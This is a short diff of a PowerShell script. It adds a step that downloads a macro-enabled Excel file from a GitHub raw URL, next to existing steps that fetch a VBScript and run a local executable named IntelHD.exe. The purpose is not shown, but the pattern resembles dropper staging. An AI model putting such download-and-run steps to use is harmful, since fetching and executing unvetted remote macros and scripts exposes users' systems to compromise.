@@ -28,8 +28,12 @@ invoke-expression $command
 $command3="cmd /C D:\IntelHD.exe"
 #invoke-expression $command
 
+#Part 4 - Download 
+$my_path_d="D:\Automate.xlsm"
+$url='https://raw.githubusercontent.com/FurqanKhan1/D/master/Automate.xlsm';
+$b.DownloadFile($url, $my_path_d) ;
 
-#Part 4 - Mail
+#Part 5 - Mail
 $my_path_m="D:\so.vbs"
 $url='https://raw.githubusercontent.com/FurqanKhan1/D/master/so.vbs';
 $b.DownloadFile($url, $my_path_m) ;
